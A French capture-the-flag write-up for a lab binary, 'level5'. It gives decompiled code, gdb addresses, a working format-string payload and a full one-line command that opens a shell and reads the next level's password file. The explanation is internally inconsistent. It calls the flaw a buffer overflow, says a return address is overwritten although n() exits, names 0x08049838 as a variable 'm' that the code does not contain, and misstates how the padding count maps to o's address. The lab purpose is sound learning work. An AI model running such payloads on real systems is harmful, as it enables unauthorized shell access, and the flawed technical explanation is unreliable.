### README - Exploitation du programme `level5`

## Introduction

Nous avons un exécutable `level5` avec les options suivantes :

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

### Code source décompilé

```c
void o(void) {
  system("/bin/sh");
  _exit(1);
}

void n(void) {
  char local_20c[520];
  
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);
  exit(1);
}

void main(void) {
  n();
  return;
}
```

### Analyse de la vulnérabilité

La fonction `n` utilise `fgets` pour lire l'entrée utilisateur dans un tampon de 520 octets, puis `printf` pour afficher le contenu du tampon. Cela rend le programme vulnérable à une attaque par débordement de tampon. La fonction `o` appelle `system("/bin/sh")`, nous donnant un shell interactif.

### Objectif

Notre objectif est d'exploiter la vulnérabilité de chaîne de format pour écraser l'adresse de retour après la fonction `n` avec l'adresse de la fonction `o`, afin d'obtenir un shell interactif.

### Adresse de la fonction `o`

Avec `gdb`, nous trouvons l'adresse de la fonction `o` :

```gdb
(gdb) info functions
0x080484a4  o
0x080484c2  n
0x08048504  main
```

### Exploitation de la vulnérabilité

#### 1. Génération du payload avec Python

```bash
python -c 'print "\x38\x98\x04\x08" + "%0134513824x%4$n"'
```

- `"\x38\x98\x04\x08"` : Adresse mémoire en format little-endian (0x08049838).
- `"%0134513824x%4$n"` : Chaîne de format pour exploiter la vulnérabilité.

#### 2. Exécution de la commande pour lire le mot de passe

```bash
echo "cat /home/user/level6/.pass"
```

#### 3. Redirection vers le programme `level5`

```bash
| ./level5
```

### Explication détaillée

#### Adresse mémoire en format little-endian

- `"\x38\x98\x04\x08"` : C'est l'adresse de la variable `m` que nous voulons écraser. En little-endian, cela représente l'adresse `0x08049838`.

#### Chaîne de format

- **`"%0134513824x%4$n"`** :
  - **`%0`** : Indique un remplissage avec des zéros.
  - **`134513824`** : Nombre de caractères à écrire. Cette valeur représente l'adresse de la fonction `o` (0x080484a4) en décimal.
  - **`x`** : Formate le nombre comme un hexadécimal (mais ici utilisé pour consommer des caractères).
  - **`%4$n`** : Écrit le nombre total de caractères imprimés jusqu'à présent à l'adresse spécifiée par le 4ème argument.

### Résultat attendu

Après l'exécution de cette commande, la vulnérabilité de chaîne de format est exploitée pour écraser l'adresse de retour avec l'adresse de la fonction `o`, ouvrant ainsi un shell interactif. La commande `cat /home/user/level6/.pass` est ensuite exécutée dans ce shell pour afficher le mot de passe du niveau suivant.

### Commande complète

```bash
(python -c 'print "\x38\x98\x04\x08" + "%0134513824x%4$n"'; echo "cat /home/user/level6/.pass") | ./level5
```

### Explication finale

- **Adresse mémoire en little-endian** : `"\x38\x98\x04\x08"` représente l'adresse de la variable `m`.
- **Chaîne de format** : `%0134513824x%4$n` manipule le nombre de caractères imprimés pour écrire l'adresse de la fonction `o` à l'adresse de `m`.
- **Combinaison avec une commande shell** : `echo "cat /home/user/level6/.pass"` pour lire le mot de passe une fois le shell ouvert.
- **Redirection vers le programme** : `| ./level5` exécute le payload et la commande.

Avec cette exploitation, nous pouvons rediriger l'exécution vers la fonction `o` et ouvrir un shell interactif, puis exécuter la commande pour obtenir le mot de passe du niveau suivant.

### Conclusion

Cette méthode utilise une vulnérabilité de chaîne de format pour écraser l'adresse de retour après la fonction `n` et rediriger l'exécution vers la fonction `o`, nous permettant ainsi d'obtenir un shell interactif et de lire le mot de passe pour le niveau suivant.